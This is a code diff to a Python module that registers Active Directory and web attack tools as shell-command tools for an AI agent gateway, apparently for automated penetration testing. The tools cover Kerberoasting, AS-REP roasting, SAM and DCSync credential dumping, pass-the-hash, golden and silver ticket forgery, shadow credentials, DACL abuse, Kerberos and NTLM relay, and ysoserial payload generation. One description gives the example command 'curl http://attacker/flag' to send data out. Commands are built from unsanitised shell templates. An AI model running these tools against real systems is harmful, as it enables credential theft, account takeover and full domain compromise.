@@ -66,14 +66,22 @@ def _parse_smbmap_output(stdout: str) -> Dict[str, Any]:
 
 
 async def _run_shell(cmd: str, timeout: int = 60) -> ToolResult:
-    """Execute a shell command with timeout."""
-    import asyncio
+    """Execute a shell command with timeout.
+
+    Sets PGPASSWORD env var to prevent psql from blocking on interactive
+    password prompts. Commands that need a password should set PGPASSWORD
+    explicitly in their command string (which overrides this default).
+    """
+    import asyncio, os
     start = time.perf_counter()
     try:
+        # Prevent psql/mysql from prompting for interactive passwords
+        no_prompt_env = {**os.environ, "PGPASSWORD": ""}
         proc = await asyncio.create_subprocess_shell(
             cmd,
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE,
+            env=no_prompt_env,
         )
         stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
         elapsed = (time.perf_counter() - start) * 1000
@@ -949,7 +957,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="psql_query",
-        command_template="PGPASSWORD={password} psql -h {host} -p {port} -U {user} -c '{query}' 2>&1",
+        command_template="PGPASSWORD='{password}' psql -h {host} -p {port} -U {user} -w -c '{query}' 2>&1",
         description="Execute a SQL query on a PostgreSQL database. Use for data extraction, COPY PROGRAM execution, and reading files.",
         parameters={
             "host": {"type": "string", "description": "PostgreSQL host IP or hostname"},
@@ -1094,9 +1102,11 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     # ── Active Directory Tools ─────────────────────────────────────
 
+    _NXC = "/home/kianabin/Darwin/venv/bin/netexec"
+
     gateway.register_shell_tool(
         name="netexec_enum",
-        command_template="netexec {protocol} {target} -u '{user}' -p '{password}' {extra_flags} 2>&1",
+        command_template=f"{_NXC} {{protocol}} {{target}} -u '{{user}}' -p '{{password}}' {{extra_flags}} 2>&1",
         description="Enumerate a target using NetExec (nxc). Supports protocols: smb, mssql, winrm, ssh, rdp, ftp. Use for share enumeration, user listing, and credential testing. Common flags: --shares (SMB), --users (LDAP), --local-auth (MSSQL).",
         parameters={
             "protocol": {"type": "string", "description": "Protocol: smb, mssql, winrm, ssh, ldap, rdp, ftp"},
@@ -1110,15 +1120,65 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="netexec_ldap_enum",
-        command_template="netexec ldap {target} -u '{user}' -p '{password}' --users 2>&1",
+        command_template=f"{_NXC} ldap {{target}} -u '{{user}}' -p '{{password}}' --users 2>&1",
         description="Enumerate AD users via LDAP using NetExec (nxc)",
         parameters={"target": {"type": "string"}, "user": {"type": "string"}, "password": {"type": "string"}},
         parser=_parse_shell_output,
         timeout=60,
     )
+    # ── NetExec SMB specialized tools ──────────────────────────────
+    gateway.register_shell_tool(
+        name="netexec_smb_shares",
+        command_template=f"{_NXC} smb {{target}} -u '{{user}}' -p '{{password}}' --shares 2>&1",
+        description="Enumerate SMB shares on a target using NetExec. Lists all accessible shares and their read/write permissions. Use to discover writable shares for file upload or to find SYSVOL for GPP/cpassword extraction. Target: IP or hostname.",
+        parameters={
+            "target": {"type": "string", "description": "Target IP or hostname"},
+            "user": {"type": "string", "description": "Domain username"},
+            "password": {"type": "string", "description": "Password"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="netexec_smb_users",
+        command_template=f"{_NXC} smb {{target}} -u '{{user}}' -p '{{password}}' --users 2>&1",
+        description="Enumerate domain users via NetExec SMB. Lists all domain users with their group memberships. Use for discovering privileged accounts and SPN-enabled service accounts.",
+        parameters={
+            "target": {"type": "string", "description": "Target Domain Controller IP"},
+            "user": {"type": "string", "description": "Domain username"},
+            "password": {"type": "string", "description": "Password"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="netexec_kerberoasting",
+        command_template=f"{_NXC} ldap {{target}} -u '{{user}}' -p '{{password}}' --kerberoasting {{output_file}} 2>&1 | head -100",
+        description="Kerberoasting via NetExec LDAP: request TGS tickets for all SPN-enabled accounts. Saves hashes in hashcat format for offline cracking. Use hash_crack tool on the output (hashcat mode 13100). Requires any authenticated domain user.",
+        parameters={
+            "target": {"type": "string", "description": "Domain Controller IP"},
+            "user": {"type": "string", "description": "Domain username"},
+            "password": {"type": "string", "description": "Password"},
+            "output_file": {"type": "string", "description": "Output file for hashcat-format hashes", "default": "/tmp/kerb_hashes.txt"},
+        },
+        parser=_parse_shell_output,
+        timeout=120,
+    )
+    gateway.register_shell_tool(
+        name="netexec_smb_sam",
+        command_template=f"{_NXC} smb {{target}} -u '{{user}}' -p '{{password}}' --sam 2>&1 | head -100",
+        description="Dump SAM database from target via NetExec SMB (requires local admin). Extracts local user NTLM hashes. Use when you have admin credentials and need local account hashes for Pass-the-Hash.",
+        parameters={
+            "target": {"type": "string", "description": "Target IP"},
+            "user": {"type": "string", "description": "Administrator username"},
+            "password": {"type": "string", "description": "Password"},
+        },
+        parser=_parse_shell_output,
+        timeout=120,
+    )
     gateway.register_shell_tool(
         name="impacket_secretsdump",
-        command_template="impacket-secretsdump {target} 2>&1 | head -100",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/secretsdump.py {target} 2>&1 | head -100",
         description="Dump SAM/LSA secrets from a target using impacket-secretsdump. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
         parser=_parse_shell_output,
@@ -1126,7 +1186,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_psexec",
-        command_template="impacket-psexec {target} 2>&1",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/psexec.py {target} 2>&1",
         description="Execute commands on a remote Windows host via PsExec. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
         parser=_parse_shell_output,
@@ -1134,7 +1194,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_wmiexec",
-        command_template="impacket-wmiexec {target} 2>&1",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/wmiexec.py {target} 2>&1",
         description="Execute commands via WMI on a remote Windows host. Target format: DOMAIN/USER:PASSWORD@TARGET_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@TARGET"}},
         parser=_parse_shell_output,
@@ -1148,25 +1208,93 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         parser=_parse_shell_output,
         timeout=30,
     )
-    gateway.register_shell_tool(
-        name="impacket_GetUserSPNs",
-        command_template="impacket-GetUserSPNs {target} -request 2>&1 | head -80",
-        description="Kerberoasting: request TGS tickets for users with SPNs. Encrypted tickets can be cracked offline. Target format: DOMAIN/USER:PASSWORD@DC_IP",
-        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
-        parser=_parse_shell_output,
+    async def _impacket_GetUserSPNs(domain: str, dc_ip: str,
+                                    user: str = "", password: str = "",
+                                    **kwargs) -> ToolResult:
+        """Kerberoasting: request TGS tickets for users with SPNs. Uses -no-pass when no password."""
+        import asyncio, time
+        start = time.perf_counter()
+        script = "/home/kianabin/Darwin/venv/bin/GetUserSPNs.py"
+        if password:
+            target = f"{domain}/{user}:{password}@{dc_ip}"
+            cmd = f"python3 {script} {target} -request 2>&1 | head -80"
+        else:
+            cmd = f"python3 {script} {domain}/{user or ''} -dc-ip {dc_ip} -request -no-pass 2>&1 | head -80"
+        try:
+            proc = await asyncio.create_subprocess_shell(
+                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
+            stdout_s = stdout.decode("utf-8", errors="replace")
+            stderr_s = stderr.decode("utf-8", errors="replace")
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(tool_name="impacket_GetUserSPNs",
+                success=(proc.returncode == 0), stdout=stdout_s, stderr=stderr_s,
+                exit_code=proc.returncode or 0, elapsed_ms=elapsed)
+        except asyncio.TimeoutError:
+            return ToolResult(tool_name="impacket_GetUserSPNs", success=False,
+                stdout="", stderr="Timed out after 120s", exit_code=-1,
+                elapsed_ms=(time.perf_counter()-start)*1000)
+        except Exception as e:
+            return ToolResult(tool_name="impacket_GetUserSPNs", success=False,
+                stdout="", stderr=str(e), exit_code=-1,
+                elapsed_ms=(time.perf_counter()-start)*1000)
+
+    gateway.register(
+        name="impacket_GetUserSPNs", func=_impacket_GetUserSPNs,
+        description="Kerberoasting: request TGS tickets for users with SPNs. Encrypted tickets can be cracked offline. Set user='' and password='' for unauthenticated Kerberoasting with -no-pass.",
+        parameters={
+            "domain": {"type": "string", "description": "Active Directory domain name"},
+            "dc_ip": {"type": "string", "description": "Domain Controller IP address"},
+            "user": {"type": "string", "description": "Username (optional, omit for -no-pass)"},
+            "password": {"type": "string", "description": "Password (optional, omit for -no-pass)"},
+        },
         timeout=120,
     )
-    gateway.register_shell_tool(
-        name="impacket_GetNPUsers",
-        command_template="impacket-GetNPUsers {target} -request -format hashcat 2>&1 | head -80",
-        description="AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Hashcat-format output for offline cracking. Target format: DOMAIN/USER:PASSWORD@DC_IP",
-        parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
-        parser=_parse_shell_output,
+    async def _impacket_GetNPUsers(domain: str, dc_ip: str,
+                                   user: str = "", password: str = "",
+                                   **kwargs) -> ToolResult:
+        """AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Uses -no-pass when no password."""
+        import asyncio, time
+        start = time.perf_counter()
+        script = "/home/kianabin/Darwin/venv/bin/GetNPUsers.py"
+        if password:
+            target = f"{domain}/{user}:{password}@{dc_ip}"
+            cmd = f"python3 {script} {target} -request -format hashcat 2>&1 | head -80"
+        else:
+            cmd = f"python3 {script} {domain}/ -dc-ip {dc_ip} -request -format hashcat -no-pass 2>&1 | head -80"
+        try:
+            proc = await asyncio.create_subprocess_shell(
+                cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
+            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=120)
+            stdout_s = stdout.decode("utf-8", errors="replace")
+            stderr_s = stderr.decode("utf-8", errors="replace")
+            elapsed = (time.perf_counter() - start) * 1000
+            return ToolResult(tool_name="impacket_GetNPUsers",
+                success=(proc.returncode == 0), stdout=stdout_s, stderr=stderr_s,
+                exit_code=proc.returncode or 0, elapsed_ms=elapsed)
+        except asyncio.TimeoutError:
+            return ToolResult(tool_name="impacket_GetNPUsers", success=False,
+                stdout="", stderr="Timed out after 120s", exit_code=-1,
+                elapsed_ms=(time.perf_counter()-start)*1000)
+        except Exception as e:
+            return ToolResult(tool_name="impacket_GetNPUsers", success=False,
+                stdout="", stderr=str(e), exit_code=-1,
+                elapsed_ms=(time.perf_counter()-start)*1000)
+
+    gateway.register(
+        name="impacket_GetNPUsers", func=_impacket_GetNPUsers,
+        description="AS-REP Roasting: request TGT for users without Kerberos pre-authentication. Hashcat-format output for offline cracking. Set user='' and password='' for unauthenticated AS-REP roasting with -no-pass.",
+        parameters={
+            "domain": {"type": "string", "description": "Active Directory domain name"},
+            "dc_ip": {"type": "string", "description": "Domain Controller IP address"},
+            "user": {"type": "string", "description": "Username (optional, omit for -no-pass)"},
+            "password": {"type": "string", "description": "Password (optional, omit for -no-pass)"},
+        },
         timeout=120,
     )
     gateway.register_shell_tool(
         name="impacket_secretsdump_dcsync",
-        command_template="impacket-secretsdump -just-dc {target} 2>&1 | head -100",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/secretsdump.py -just-dc {target} 2>&1 | head -100",
         description="DCSync: replicate domain credentials from a Domain Controller. Requires Replication-Get-Changes-All privilege. Target format: DOMAIN/USER:PASSWORD@DC_IP",
         parameters={"target": {"type": "string", "description": "DOMAIN/USER:PASSWORD@DC_IP"}},
         parser=_parse_shell_output,
@@ -1174,7 +1302,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_pth",
-        command_template="impacket-psexec -hashes :{nthash} {target} 2>&1",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/psexec.py -hashes :{nthash} {target} 2>&1",
         description="Pass-the-Hash: execute commands on a remote Windows host using an NTLM hash instead of a password. Target format: DOMAIN/USER@TARGET_IP. Requires the user's NTLM hash (from secretsdump or DCSync).",
         parameters={
             "nthash": {"type": "string", "description": "NTLM hash (NT part, 32 hex chars)"},
@@ -1185,7 +1313,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_ticketer",
-        command_template="impacket-ticketer -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {krbtgt_hash} -domain-sid {domain_sid} -domain {domain} {user} 2>&1 | head -50",
         description="Golden Ticket: forge a Kerberos TGT using the KRBTGT account hash. Grants domain-wide persistence and privilege escalation. Requires KRBTGT NTLM hash and domain SID.",
         parameters={
             "krbtgt_hash": {"type": "string", "description": "KRBTGT account NTLM hash"},
@@ -1201,7 +1329,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     gateway.register_shell_tool(
         name="impacket_silver_ticket",
-        command_template="impacket-ticketer -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/ticketer.py -nthash {service_hash} -domain-sid {domain_sid} -domain {domain} -spn {service_spn} {user} 2>&1 | head -50",
         description="Silver Ticket: forge a Kerberos TGS (service ticket) using the target service account's NTLM hash. Grants access to a specific service (e.g. 'cifs/dc.domain.com', 'http/web.domain.com') without domain admin privileges. Requires the service account's NTLM hash and domain SID.",
         parameters={
             "service_hash": {"type": "string", "description": "Target service account NTLM hash (32 hex chars)"},
@@ -1218,7 +1346,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
 
     gateway.register_shell_tool(
         name="impacket_getST",
-        command_template="impacket-getST -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
+        command_template="python3 /home/kianabin/Darwin/venv/bin/getST.py -spn {spn} -impersonate {target_user} {target} 2>&1 | head -80",
         description="S4U2Self/S4U2Proxy Constrained Delegation: request a service ticket on behalf of another user via Kerberos constrained delegation. Use when a service account has msDS-AllowedToDelegateTo configured. Target format: DOMAIN/USER:PASSWORD@DC_IP.",
         parameters={
             "spn": {"type": "string", "description": "Target service SPN (e.g. 'ldap/dc01.domain.local', 'cifs/dc01.domain.local')"},
@@ -1658,6 +1786,91 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
         timeout=30,
     )
 
+    # ── AD Advanced Tools (AD-18/19/20/21) ────────────────────────
+
+    gateway.register_shell_tool(
+        name="pywhisker",
+        command_template="/home/kianabin/Darwin/venv/bin/pywhisker -d {domain} -u {user} -p '{password}' -t {target} --action add -D {target_user} 2>&1 | head -50",
+        description="Shadow Credentials attack (AD-18): add KeyCredentialLink to a target user in Active Directory to take over the account. Uses PKINIT to authenticate with the added key. Requires an account with GenericWrite/GenericAll over the target user.",
+        parameters={
+            "domain": {"type": "string", "description": "Fully qualified domain name"},
+            "user": {"type": "string", "description": "Attacker username with write privilege on target"},
+            "password": {"type": "string", "description": "Attacker password"},
+            "target": {"type": "string", "description": "Target user to take over (e.g. svc_shadow)"},
+            "target_user": {"type": "string", "description": "Target user sAMAccountName for the shadow credential"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="gettgtpkinit",
+        command_template="python3 /opt/PKINITtools/gettgtpkinit.py -cert-pem {cert_pem} -key-pem {key_pem} {domain}/{target_user} {ccache_file} 2>&1",
+        description="Get Kerberos TGT via PKINIT using a certificate and private key (from Shadow Credentials attack). Use after pywhisker to authenticate as the target user. Outputs a ccache file for use with impacket tools.",
+        parameters={
+            "domain": {"type": "string", "description": "Fully qualified domain name"},
+            "target_user": {"type": "string", "description": "Target username to authenticate as"},
+            "cert_pem": {"type": "string", "description": "Path to certificate PEM file", "default": "/tmp/cert.pem"},
+            "key_pem": {"type": "string", "description": "Path to private key PEM file", "default": "/tmp/key.pem"},
+            "ccache_file": {"type": "string", "description": "Output ccache file path", "default": "/tmp/user.ccache"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="getnthash",
+        command_template="python3 /opt/PKINITtools/getnthash.py -key {asrep_key} {domain}/{target_user} 2>&1",
+        description="Recover NT hash via PKINIT U2U (User-to-User) authentication. Use after gettgtpkinit — the AS-REP encryption key from the TGT can be used to recover the user's NT hash without DCSync.",
+        parameters={
+            "domain": {"type": "string", "description": "Fully qualified domain name"},
+            "target_user": {"type": "string", "description": "Target username"},
+            "asrep_key": {"type": "string", "description": "AS-REP encryption key from gettgtpkinit output"},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="bloodyad_dacl",
+        command_template="python3 /opt/bloodyAD/bloodyAD.py -d {domain} -u {user} -p '{password}' --host {target} {action} {target_object} {extra} 2>&1  | head -80",
+        description="AD DACL abuse via bloodyAD (AD-19, AD-20). Supports: set owner (WriteOwner), add GenericAll (ForceChangePassword), shadow credentials add, and other DACL modifications. Use when you have an account with write privileges over a target object but no direct control.",
+        parameters={
+            "domain": {"type": "string", "description": "Fully qualified domain name"},
+            "user": {"type": "string", "description": "Attacker username"},
+            "password": {"type": "string", "description": "Attacker password"},
+            "target": {"type": "string", "description": "Domain Controller hostname or IP"},
+            "action": {"type": "string", "description": "Action: set owner, add GenericAll, add groupMember, set password, shadowCredentials"},
+            "target_object": {"type": "string", "description": "Target DN or sAMAccountName to modify"},
+            "extra": {"type": "string", "description": "Extra arguments (e.g. new owner DN for set owner)", "default": ""},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+    gateway.register_shell_tool(
+        name="krbrelayx",
+        command_template="timeout 60 python3 /opt/krbrelayx/krbrelayx.py -t {target} -p {port} {extra_args} 2>&1 | head -80",
+        description="Kerberos Unconstrained Delegation relay attack (AD-21). Relays captured Kerberos TGTs from unconstrained delegation hosts to gain domain admin access. Requires a machine with unconstrained delegation or the ability to coerce authentication.",
+        parameters={
+            "target": {"type": "string", "description": "Target DNS hostname or IP to relay to"},
+            "port": {"type": "string", "description": "Target port", "default": "445"},
+            "extra_args": {"type": "string", "description": "Extra krbrelayx arguments", "default": ""},
+        },
+        parser=_parse_shell_output,
+        timeout=60,
+    )
+
+    # ── Java Deserialization Tool (WEB-01) ─────────────────────────
+
+    gateway.register_shell_tool(
+        name="ysoserial_generate",
+        command_template="java -jar /opt/ysoserial-all.jar {gadget} '{command}' 2>&1 | head -200",
+        description="Generate a Java deserialization payload using ysoserial. Used for Tomcat deserialization RCE (WEB-01, CVE-2025-24813) and other Java deserialization vulnerabilities. Choose a gadget chain based on the target's classpath. Common gadgets: CommonsCollections1-7, CommonsBeanutils1, Groovy1, Spring1, Jdk7u21.",
+        parameters={
+            "gadget": {"type": "string", "description": "ysoserial gadget chain name (e.g. CommonsCollections1, CommonsBeanutils1, Groovy1, Spring1, Jdk7u21)"},
+            "command": {"type": "string", "description": "Command to execute on the target (e.g. 'curl http://attacker/flag')"},
+        },
+        parser=_parse_shell_output,
+        timeout=30,
+    )
+
     # ── Kubernetes Tools ───────────────────────────────────────────
 
     gateway.register_shell_tool(
@@ -1816,7 +2029,7 @@ def register_attack_tools(gateway: MCPGateway) -> MCPGateway:
     )
     gateway.register_shell_tool(
         name="impacket_ntlmrelayx",
-        command_template="timeout 30 impacket-ntlmrelayx -t {target_url} {extra_args} 2>&1",
+        command_template="timeout 30 python3 /home/kianabin/Darwin/venv/bin/ntlmrelayx.py -t {target_url} {extra_args} 2>&1",
         description="Run NTLM relay attack via impacket-ntlmrelayx. Use for AD CS ESC8 (AD-06, AD-Chain-2/3/6) — relay captured NTLM authentication to AD CS HTTP endpoint to obtain certificates. Target URL should point to the AD CS certsrv endpoint (e.g. 'http://dc/certsrv/certfnsh.asp'). Add '-smb2support' for SMBv2 targets.",
         parameters={
             "target_url": {"type": "string", "description": "Target URL to relay NTLM auth to (e.g. AD CS HTTP endpoint)"},
